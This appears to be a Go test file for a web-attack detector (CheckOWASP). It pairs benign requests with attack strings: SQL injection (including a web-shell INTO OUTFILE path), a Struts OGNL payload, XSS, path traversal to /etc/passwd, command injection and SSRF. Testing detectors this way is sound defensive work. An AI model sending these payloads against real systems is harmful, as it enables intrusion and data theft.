		{name: "confluence", path: "/REST/TINYMCE/1/MACRO/PREVIEW", category: CatExprLang, ruleID: "owasp:path:005"},
		{name: "cisco", path: "/%2BCSCOT%2B/config", category: CatPathTrav, ruleID: "owasp:path:006"},
		{name: "extdirect", path: "/SERVICE/EXTDIRECT", category: CatCmdInject, ruleID: "owasp:path:017"},
	}
	for _, tt := range tests {
		hits := CheckOWASP("mid", tt.path, "", nil, nil)
		if !hasCategory(hits, tt.category) {
			t.Fatalf("%s: expected category %s for path %q, got %+v", tt.name, tt.category, tt.path, hits)
		}
		if !hasRuleID(hits, tt.ruleID) {
			t.Fatalf("%s: expected rule %s for path %q, got %+v", tt.name, tt.ruleID, tt.path, hits)
		}
	}
}

func TestCheckOWASP_StrutsOGNLRedirect(t *testing.T) {
	hits := CheckOWASP("high", "index.action", `redirect:${#a=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#b=#a.getRealPath("/"),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#matt.getWriter().println(#b),#matt.getWriter().flush(),#matt.getWriter().close()}`, nil, nil)
	if len(hits) == 0 {
		t.Fatal("expected OGNL redirect payload to be detected")
	}
}

func TestCheckOWASP_Clean_CGIErrorTelemetry(t *testing.T) {
	hits := CheckOWASP("high", "/event", "e=cgi-error", nil, []string{"CGI </cgi/com?action=getWhiteList> #Success (126ms)"})
	if len(hits) > 0 {
		t.Fatalf("cgi telemetry should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_BlazeShortBase64QueryStillDetected(t *testing.T) {
	// Full base64 payload that decodes to "1 # ... aND\x00/* ... */1=1" — real SQLi tautology
	hits := CheckOWASP("high", "/subsidiary/adapt", "refresh=mediocre&module=leverage&initiative=MSAjIGZlZmZsYWJlbGxlZGJ5dGFiaW5kZXhpbnRlZ3JpdHl1bmRvcHJvZ3Jlc3NncmF5dG9mZmVvcGVuIAphTkQALyogY29sbGVjdGlvbnNhd2FpdApjbG9zZXN0cG9zaXRpb25zbGlucHVzdmltZW9taW5pbW9ibGF6ZXJ0cmltdHlwZQpyc3luYw1uaWNlbmFtZWV4Y2x1c2l2ZXBvaW50ZGlydHkgKi8xPTE%3D", map[string]string{"Cookie": "master=undertake; SESSIONID=1e0c2f9b6fa06a255da5e3"}, nil)
	if len(hits) == 0 {
		t.Fatal("expected suspicious short base64 query payload to be detected")
	}
}

func TestCheckOWASP_Clean_SearchQuery(t *testing.T) {
	hits := CheckOWASP("mid", "/search", "q=how+to+build+a+website&page=1", nil, nil)
	if len(hits) > 0 {
		t.Fatalf("normal search query should not trigger, got %+v", hits)
	}
}

// ── 新增检测能力测试 ──

// GROUP BY 注入 — 之前因 hasSQLiIndicator 缺少 "group by" 而漏报
func TestCheckOWASP_SQLi_GroupBy(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 GROUP BY 1--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for GROUP BY column enumeration")
	}
}

// 堆叠查询含 SELECT — 之前 sqli:004 不包含 SELECT 而漏报
func TestCheckOWASP_SQLi_StackedSelect(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1; SELECT user()--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for stacked SELECT query")
	}
}

// 子查询比较 — 新模式 sqli:031
func TestCheckOWASP_SQLi_SubqueryComparison(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1=(SELECT 1 FROM users)", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for subquery comparison")
	}
}

// Blind SQLi 假条件（AND 1=2）— 之前被 isSQLiFalsePositive 过度抑制
func TestCheckOWASP_SQLi_BlindFalseCondition(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 AND 1=2", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for blind false condition (AND 1=2)")
	}
}

func TestShouldScanSQLiBooleanPrefilterKeepsAttackShapes(t *testing.T) {
	signals := collectSQLiPatternSignals("id=1 and 1=2")
	if !shouldScanSQLiPatternWithSignals("id=1 and 1=2", findSQLiPatternForTest("owasp:sqli:010"), signals) {
		t.Fatal("numeric boolean SQLi shape should enter sqli:010 regex")
	}
	signals = collectSQLiPatternSignals(`name=admin" or "a"="a"`)
	if !shouldScanSQLiPatternWithSignals(`name=admin" or "a"="a"`, findSQLiPatternForTest("owasp:sqli:011"), signals) {
		t.Fatal("quoted boolean SQLi shape should enter sqli:011 regex")
	}
	signals = collectSQLiPatternSignals(`id=1' or ''='`)
	if !shouldScanSQLiPatternWithSignals(`id=1' or ''='`, findSQLiPatternForTest("owasp:sqli:036"), signals) {
		t.Fatal("empty quoted boolean SQLi shape should enter sqli:036 regex")
	}
}

func TestShouldScanSQLiBooleanPrefilterSkipsPlainText(t *testing.T) {
	tests := []struct {
		id    string
		input string
	}{
		{id: "owasp:sqli:010", input: "cmd=describesitemsgsummary&secure=1&version=3&dictid=2363"},
		{id: "owasp:sqli:011", input: `roll off="yes" and title="report"`},
		{id: "owasp:sqli:036", input: `text says or "" but has no comparison`},
	}
	for _, tt := range tests {
		signals := collectSQLiPatternSignals(tt.input)
		if shouldScanSQLiPatternWithSignals(tt.input, findSQLiPatternForTest(tt.id), signals) {
			t.Fatalf("%s should skip plain text input %q", tt.id, tt.input)
		}
	}
}

func TestShouldScanSQLiFunctionAndHexPrefilter(t *testing.T) {
	sqli007 := findSQLiPatternForTest("owasp:sqli:007")
	for _, input := range []string{
		"id=chr(65)",
		"id=unhex (414243)",
		"id=conv (10,10,16)",
	} {
		signals := collectSQLiPatternSignals(input)
		if !shouldScanSQLiPatternWithSignals(input, sqli007, signals) {
			t.Fatalf("sqli:007 should enter regex for %q", input)
		}
	}
	for _, input := range []string{
		"description=chromium browser setting",
		"name=unhexagonal layout",
		"topic=conversation notes",
	} {
		signals := collectSQLiPatternSignals(input)
		if shouldScanSQLiPatternWithSignals(input, sqli007, signals) {
			t.Fatalf("sqli:007 should skip plain text input %q", input)
		}
	}

	sqli008 := findSQLiPatternForTest("owasp:sqli:008")
	for _, input := range []string{
		"id=(0x41414141)",
		"id=0xdeadbeef",
		"items, 0xabcdef",
	} {
		signals := collectSQLiPatternSignals(input)
		if !shouldScanSQLiPatternWithSignals(input, sqli008, signals) {
			t.Fatalf("sqli:008 should enter regex for %q", input)
		}
	}
	for _, input := range []string{
		"color=0xff",
		"token 0x41414141",
		"value=(0xzzzz)",
	} {
		signals := collectSQLiPatternSignals(input)
		if shouldScanSQLiPatternWithSignals(input, sqli008, signals) {
			t.Fatalf("sqli:008 should skip plain text input %q", input)
		}
	}

	sqli022 := findSQLiPatternForTest("owasp:sqli:022")
	for _, input := range []string{
		"id=if(ascii(substr(user(),1,1))=115,1,0)",
		"id=if ( length(password)>5,1,0)",
		"id=if(select 1,1,0)",
	} {
		signals := collectSQLiPatternSignals(input)
		if !shouldScanSQLiPatternWithSignals(input, sqli022, signals) {
			t.Fatalf("sqli:022 should enter regex for %q", input)
		}
	}
	for _, input := range []string{
		"notification count(version) text",
		"specific(ascii) label",
	} {
		signals := collectSQLiPatternSignals(input)
		if shouldScanSQLiPatternWithSignals(input, sqli022, signals) {
			t.Fatalf("sqli:022 should skip plain text input %q", input)
		}
	}
}

func findSQLiPatternForTest(id string) owaspPattern {
	for _, p := range sqliPatterns {
		if p.id == id {
			return p
		}
	}
	panic("missing SQLi pattern " + id)
}

// SSRF localhost 在 mid 敏感度下必须触发 — 之前 score=3 在 mid 下不触发
func TestCheckOWASP_SSRF_LocalhostMidSensitivity(t *testing.T) {
	hits := CheckOWASP("mid", "/", "url=http://127.0.0.1/admin", nil, nil)
	if !hasCategory(hits, CatSSRF) {
		t.Fatal("expected SSRF hit for localhost at mid sensitivity")
	}
}

// 私有 IP 无 URL 上下文不触发 — 之前 score 3+3=6 会误报
func TestCheckOWASP_SSRF_PrivateIPNoURLContext(t *testing.T) {
	hits := CheckOWASP("mid", "/network", "src_ip=10.0.0.1&dst_ip=192.168.1.1", nil, nil)
	if hasCategory(hits, CatSSRF) {
		t.Fatal("bare private IPs without URL scheme should not trigger SSRF")
	}
}

// 私有 IP 有 URL 上下文必须触发
func TestCheckOWASP_SSRF_PrivateIPWithURLContext(t *testing.T) {
	hits := CheckOWASP("mid", "/", "url=http://192.168.1.1/admin", nil, nil)
	if !hasCategory(hits, CatSSRF) {
		t.Fatal("expected SSRF hit for private IP with http:// scheme")
	}
}

// JavaScript ";delete" 不触发 SQLi — sqli:004 新增 FP 抑制
func TestCheckOWASP_Clean_JSDelete(t *testing.T) {
	hits := CheckOWASP("mid", "/api", "", nil, []string{"cache.clear(); delete tempObj"})
	if hasCategory(hits, CatSQLi) {
		t.Fatal("JavaScript ';delete' without SQL structural context should not trigger SQLi")
	}
}

// 含 table 关键字的堆叠 DROP 必须触发
func TestCheckOWASP_SQLi_DropTable(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1; DROP TABLE users--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("expected SQLi hit for DROP TABLE")
	}
}

// XSS 事件处理器无 < 标签（注入现有属性场景）
func TestCheckOWASP_XSS_BareEventHandler(t *testing.T) {
	hits := CheckOWASP("mid", "/", `name=" onmouseover="alert(1)`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("expected XSS hit for bare event handler injection into attribute context")
	}
}

// CMD 注入：URL 参数 ;id=123 不触发（最常见误报场景）
func TestCheckOWASP_Clean_URLParamSemicolonID(t *testing.T) {
	hits := CheckOWASP("mid", "/api", "action=submit;id=123&type=user", nil, nil)
	if hasCategory(hits, CatCmdInject) {
		t.Fatal("URL parameter 'action=submit;id=123' should not trigger cmd injection")
	}
}

// CMD 注入：; id 在行尾（真实攻击）仍然触发
func TestCheckOWASP_CmdInject_SemicolonIDAtEnd(t *testing.T) {
	hits := CheckOWASP("mid", "/ping", "host=8.8.8.8;id", nil, nil)
	if !hasCategory(hits, CatCmdInject) {
		t.Fatal("expected cmd injection hit for 'host=8.8.8.8;id' at end of string")
	}
}

// CMD 注入：pipe 后跟 =value 不触发
func TestCheckOWASP_Clean_PipeEqualsParam(t *testing.T) {
	hits := CheckOWASP("mid", "/filter", "a=1&b=x|id=5&c=y", nil, nil)
	if hasCategory(hits, CatCmdInject) {
		t.Fatal("'|id=5' as URL parameter should not trigger cmd injection")
	}
}

// ── 新增误报抑制验证测试 ──

// XSS：SVG图标 + iframe嵌入（常见于CMS富文本）不应触发
func TestCheckOWASP_Clean_SVGAndIframe(t *testing.T) {
	body := `<svg xmlns="http://www.w3.org/2000/svg" width="24"><path d="M10 20"/></svg>` +
		`<iframe src="https://youtube.com/embed/abc123" allowfullscreen></iframe>`
	hits := CheckOWASP("mid", "/post", "", nil, []string{body})
	if hasCategory(hits, CatXSS) {
		t.Fatalf("SVG icon + iframe embed in rich HTML should not trigger XSS at mid sensitivity, got %+v", hits)
	}
}

// XSS：SVG + embed 无事件处理器，mid 敏感度不应触发
func TestCheckOWASP_Clean_SVGAndEmbed(t *testing.T) {
	body := `<svg width="100"><circle cx="50" cy="50" r="40"/></svg>` +
		`<embed src="/docs/report.pdf" type="application/pdf" width="600" height="400">`
	hits := CheckOWASP("mid", "/view", "", nil, []string{body})
	if hasCategory(hits, CatXSS) {
		t.Fatalf("SVG + PDF embed without event handlers should not trigger XSS, got %+v", hits)
	}
}

// XSS：高敏感度 <base href> 仍然检出（保持高敏模式有效性）
func TestCheckOWASP_XSS_BaseHrefHighSensitivity(t *testing.T) {
	hits := CheckOWASP("high", "/", `q=<base href="https://evil.com/">`, nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("base href injection should still trigger at high sensitivity")
	}
}

// SQLi：文本中的 GROUP BY 无 SQL 终止符不应触发
func TestCheckOWASP_Clean_GroupByInText(t *testing.T) {
	body := "Use GROUP BY 1 to sort results in MySQL queries for aggregation"
	hits := CheckOWASP("mid", "/api/docs", "", nil, []string{body})
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("'GROUP BY 1' in documentation text should not trigger SQLi, got %+v", hits)
	}
}

// SQLi：GROUP BY 带 -- 注释仍然检出
func TestCheckOWASP_SQLi_GroupByWithComment(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 GROUP BY 1--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("GROUP BY with SQL comment should still trigger SQLi")
	}
}

// ── sqli:022 和 sqli:003 误报抑制测试 ──

// sqli:022: if(length) 作为 JavaScript 变量检查不触发
func TestCheckOWASP_Clean_JSIfLength(t *testing.T) {
	hits := CheckOWASP("mid", "/api", "", nil, []string{"if (length === 0) return null;"})
	if hasCategory(hits, CatSQLi) {
		t.Fatal("if(length) as JavaScript variable guard should not trigger SQLi")
	}
}

// sqli:022: if(count) 作为 JavaScript 变量检查不触发
func TestCheckOWASP_Clean_JSIfCount(t *testing.T) {
	hits := CheckOWASP("mid", "/", "limit=10&sort=if(count>0,asc,desc)", nil, nil)
	if hasCategory(hits, CatSQLi) {
		t.Fatal("if(count) as JavaScript comparison should not trigger SQLi")
	}
}

// sqli:022: if(ascii(...)) 仍然触发（SQL 特有函数）
func TestCheckOWASP_SQLi_IfAscii(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=if(ascii(substr(user(),1,1))=115,1,0)", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("if(ascii(substr(user()))) should still trigger SQLi")
	}
}

// sqli:022: if(length(password)>5,1,0) 作为 SQL 函数调用仍然触发
func TestCheckOWASP_SQLi_IfLengthFunc(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 and if(length(password)>5,1,0)--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("if(length(password)) SQL function call should trigger SQLi")
	}
}

// sqli:003: JavaScript sleep() 不触发
func TestCheckOWASP_Clean_JSSleep(t *testing.T) {
	hits := CheckOWASP("mid", "/api", "", nil, []string{
		"function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }",
	})
	if hasCategory(hits, CatSQLi) {
		t.Fatal("JavaScript sleep() function definition should not trigger SQLi")
	}
}

// sqli:003: SQL sleep() 仍然触发（有 SQL 上下文）
func TestCheckOWASP_SQLi_SleepWithContext(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 AND (SELECT sleep(5))", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("sleep() with SQL SELECT context should trigger SQLi")
	}
}

// sqli:003: 注入模式 "1); sleep(5)--" 仍然触发
func TestCheckOWASP_SQLi_SleepInjection(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1); sleep(5)--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("1); sleep(5)-- injection pattern should trigger SQLi")
	}
}

// 路径穿越: ../../etc/passwd 仍然触发
func TestCheckOWASP_PathTrav_EtcPasswdStillDetected(t *testing.T) {
	hits := CheckOWASP("mid", "/", "file=../../etc/passwd", nil, nil)
	if !hasCategory(hits, CatPathTrav) {
		t.Fatal("../../etc/passwd should still trigger path traversal")
	}
}

// ── sqli:001 suppressor tests ──

// 搜索引擎查询中含 "union select" 不触发（FP 场景：开发者在 segmentfault 搜索 SQL 语法）
func TestCheckOWASP_Clean_UnionSelectSearchQuery(t *testing.T) {
	hits := CheckOWASP("mid", "/search", "q=union+select+%E5%85%B3%E9%94%AE%E5%AD%97%E6%80%8E%E4%B9%88%E7%94%A8", nil, nil)
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("'union select' in search query without SQL markers should not trigger, got %+v", hits)
	}
}

// Bing autocomplete bq 参数含 "union select" 不触发（FP 场景）
func TestCheckOWASP_Clean_UnionSelectBingQuery(t *testing.T) {
	hits := CheckOWASP("mid", "/AS/Suggestions", "bq=site:segmentfault.com+union+select+syntax", nil, nil)
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("'union select' in Bing autocomplete bq param should not trigger, got %+v", hits)
	}
}

// 真实 UNION SELECT 带列列表仍然触发
func TestCheckOWASP_SQLi_UnionSelectColumns(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 UNION SELECT 1,2,3--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("UNION SELECT with column list should still trigger")
	}
}

// 真实 UNION SELECT FROM 仍然触发
func TestCheckOWASP_SQLi_UnionSelectFrom(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 UNION SELECT * FROM users", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("UNION SELECT FROM should still trigger")
	}
}

// 真实 UNION SELECT NULL 仍然触发
func TestCheckOWASP_SQLi_UnionSelectNull(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1 UNION SELECT NULL,NULL,NULL", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("UNION SELECT NULL should still trigger")
	}
}

// ── sqli:017 suppressor tests ──

// AWS Aurora 文档 "INTO OUTFILE S3" 不触发（无引号路径）
func TestCheckOWASP_Clean_IntoOutfileS3(t *testing.T) {
	hits := CheckOWASP("mid", "/", "", nil, []string{"SELECT INTO OUTFILE S3 the following statement exports"})
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("'INTO OUTFILE S3' without quoted path should not trigger, got %+v", hits)
	}
}

// 真实 INTO OUTFILE 带引号路径仍然触发
func TestCheckOWASP_SQLi_IntoOutfileWithPath(t *testing.T) {
	hits := CheckOWASP("mid", "/", "q=1 INTO OUTFILE '/var/www/html/shell.php'", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("INTO OUTFILE with quoted path should still trigger")
	}
}

// ── xss:002 suppressor tests ──

// CDN onload 回调参数不触发（Cloudflare Turnstile 模式）
func TestCheckOWASP_Clean_CDNOnloadCallback(t *testing.T) {
	hits := CheckOWASP("mid", "/turnstile/v0/g/api.js", "onload=_cf_chl_turnstile_l&render=explicit", nil, nil)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("CDN ?onload=callback should not trigger XSS, got %+v", hits)
	}
}

// CDN onload 回调在高敏感度下也不应触发（xss:002 FP 在 threshold≤2 时绕过了 isXSSFalsePositive）
func TestCheckOWASP_Clean_CDNOnloadCallback_High(t *testing.T) {
	hits := CheckOWASP("high", "/turnstile/v0/g/api.js", "onload=_cf_chl_turnstile_l&render=explicit", nil, nil)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("CDN ?onload=callback should not trigger XSS at high sensitivity, got %+v", hits)
	}
}

// reCAPTCHA onload 回调在高敏感度下也不应触发
func TestCheckOWASP_Clean_ReCaptchaOnload_High(t *testing.T) {
	hits := CheckOWASP("high", "/recaptcha/api.js", "onload=captchaOnload&render=explicit", nil, nil)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("reCAPTCHA ?onload=callback should not trigger XSS at high sensitivity, got %+v", hits)
	}
}

// S3 ARN 通配符不触发 SQLi（arn:aws:s3:::bucket01/* 中 1/* 匹配 sqli:005）
func TestCheckOWASP_Clean_S3ARNWildcard(t *testing.T) {
	hits := CheckOWASP("high", "/", "source=arn:aws:s3:::sample-loaddata01/*&format=json", nil, nil)
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("S3 ARN wildcard should not trigger SQLi, got %+v", hits)
	}
}

// 真实 SQL 注入用 /* 未闭合注释仍然检出（sqli:005 /* 分支）
func TestCheckOWASP_SQLi_SlashStarComment(t *testing.T) {
	// Unclosed /* comment (not stripped by stripSQLComments) — real SQL injection probing
	hits := CheckOWASP("high", "/", "id=queryvalue1/*", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("SQL unclosed /* comment injection should still trigger SQLi")
	}
}

// Google reCAPTCHA onload 回调参数不触发
func TestCheckOWASP_Clean_ReCaptchaOnload(t *testing.T) {
	hits := CheckOWASP("mid", "/recaptcha/api.js", "onload=captchaOnload&render=explicit", nil, nil)
	if hasCategory(hits, CatXSS) {
		t.Fatalf("reCAPTCHA ?onload=callback should not trigger XSS, got %+v", hits)
	}
}

// 真实 onload=alert(1) 仍然触发
func TestCheckOWASP_XSS_OnloadAlert(t *testing.T) {
	hits := CheckOWASP("mid", "/", "q=onload=alert(1)", nil, nil)
	if !hasCategory(hits, CatXSS) {
		t.Fatal("onload=alert(1) should still trigger XSS")
	}
}

// ── sqli:006 suppressor tests ──

// CSP 报告中 'use strict'; concat(...) 不触发
func TestCheckOWASP_Clean_CSPReportUseStrict(t *testing.T) {
	hits := CheckOWASP("mid", "/api/report", "", nil, []string{
		"'use strict'; if (length > 0) { return concat(a, b); }",
	})
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("CSP/NEL report with JavaScript 'use strict'; concat() should not trigger SQLi, got %+v", hits)
	}
}

// NEL 报告中裸 JS 语句不触发
func TestCheckOWASP_Clean_NELReportJS(t *testing.T) {
	hits := CheckOWASP("mid", "/csp/report.htm", "", nil, []string{
		"'strict'; if (length > 0) { return result; }",
	})
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("NEL report with JavaScript should not trigger SQLi, got %+v", hits)
	}
}

// sqli:006 真实注入场景仍然触发（带 FROM 上下文）
func TestCheckOWASP_SQLi_006WithSQLContext(t *testing.T) {
	hits := CheckOWASP("mid", "/", "id=1' ; SELECT * FROM users--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("sqli:006 with SELECT FROM context should still trigger")
	}
}

// sqli:006 真实注入场景仍然触发（带 DROP TABLE 上下文）
func TestCheckOWASP_SQLi_006WithDropTable(t *testing.T) {
	hits := CheckOWASP("mid", "/", "name='; DROP TABLE users--", nil, nil)
	if !hasCategory(hits, CatSQLi) {
		t.Fatal("sqli:006 with DROP TABLE context should still trigger")
	}
}

// ── Sec-Ch-Ua 扩展请求头不触发测试 ──

// Sec-Ch-Ua-Full-Version-List 含引号和分号不触发
func TestCheckOWASP_Clean_SecChUaFullVersionList(t *testing.T) {
	headers := map[string]string{
		"Sec-Ch-Ua-Full-Version-List": `"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.199", "Google Chrome";v="114.0.5735.199"`,
		"Sec-Ch-Ua-Platform-Version":  `"14.0.0"`,
		"Sec-Ch-Ua-Arch":              `"x86"`,
	}
	hits := CheckOWASP("mid", "/AS/Suggestions", "qry=test", headers, nil)
	if len(hits) > 0 {
		t.Fatalf("extended Client Hints headers should not trigger any detection, got %+v", hits)
	}
}

// X-Client-Data 请求头（Google Chrome 发送的 base64 数据）不触发
func TestCheckOWASP_Clean_XClientData(t *testing.T) {
	headers := map[string]string{
		"X-Client-Data": "CJG2yQEIpLbJAQipncoBCMKTywEIkqHLAQj6mM0BCIWgzQEIpL3NAQ==",
	}
	hits := CheckOWASP("mid", "/recaptcha/api.js", "onload=captchaOnload&render=explicit", headers, nil)
	if hasCategory(hits, CatXSS) || hasCategory(hits, CatSQLi) {
		t.Fatalf("X-Client-Data header should not trigger any detection, got %+v", hits)
	}
}

func TestCheckOWASP_CategorySensitivityDisablesCategory(t *testing.T) {
	hits := CheckOWASP("high", "/", `q=<base href="https://evil.com/">`, nil, nil, map[string]string{string(CatXSS): "off"})
	if hasCategory(hits, CatXSS) {
		t.Fatalf("disabled XSS category should not trigger, got %+v", hits)
	}
}

func TestCheckOWASP_CategorySensitivityOverridesGlobalLevel(t *testing.T) {
	hits := CheckOWASP("mid", "/", `q=<base href="https://evil.com/">`, nil, nil, map[string]string{string(CatXSS): "strict"})
	if !hasCategory(hits, CatXSS) {
		t.Fatal("strict XSS override should trigger when global sensitivity is mid")
	}
}

func TestCheckOWASP_Debug_BingCSPReport(t *testing.T) {
	body := `[{"age":9694,"body":{"blockedURL":"https://r.bing.com/rp/ICf9X-WMafiZOnS_3M9RpM8994E.gz.js","disposition":"report","documentURL":"https://cn.bing.com/","effectiveDirective":"script-src-elem","lineNumber":1,"originalPolicy":"script-src https: 'strict-dynamic' 'report-sample' 'nonce-z35bKtCXz88W1OJrsFFgnLdDdiySmR6T76aMSP6v1Ec='; base-uri 'self';report-to csp-endpoint","referrer":"","sample":"","sourceFile":"https://cn.bing.com/","statusCode":200},"type":"csp-violation","url":"https://cn.bing.com/","user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"}]`
	hits := CheckOWASP("mid", "/api/report", "cat=bingcsp", nil, []string{body})
	if hasCategory(hits, CatSQLi) {
		t.Fatalf("Bing CSP report body should not trigger SQLi, got %+v", hits)
	}
}
